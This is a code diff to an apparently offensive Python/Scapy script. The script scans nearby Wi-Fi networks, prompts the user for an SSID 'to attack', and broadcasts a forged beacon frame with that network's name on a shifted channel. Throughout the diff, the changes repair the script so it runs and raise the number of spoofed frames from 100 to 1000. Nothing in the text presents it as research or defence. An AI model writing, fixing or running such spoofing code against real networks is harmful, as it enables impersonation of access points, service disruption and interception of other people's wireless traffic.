@@ -40,7 +40,7 @@ def change_channel():
 
 if __name__ == "__main__":
     # interface name, check using iwconfig
-    interface = "wlan0mon"
+    interface = "wlan0"
     # start the channel changer
     channel_changer = Thread(target=change_channel)
     channel_changer.daemon = True
@@ -52,6 +52,7 @@ if __name__ == "__main__":
     change_channel_running = False
     channel_changer.join()
     # let user choose what SSID to attack
+    print(networks)
     print('Type the SSID to attack:')
     chosen_ssid = input()
     # check if chosen ssid exists
@@ -67,7 +68,8 @@ if __name__ == "__main__":
 
     frame = RadioTap()/dot11/Dot11Beacon()/essid
     # set the channel
-    channel_to_send = (chosen_network['Channel'] + 6) % 14
+    channel_to_send = (chosen_network.iloc[0]['Channel'] + 6) % 14
+    print("switching to channel " + str(channel_to_send))
     os.system(f"iwconfig {interface} channel {channel_to_send}")
     # send the beacon frame 100 times with inter time 0.1s
-    sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)
+    sendp(frame, inter=0.1, count=1000, iface=interface, verbose=1)
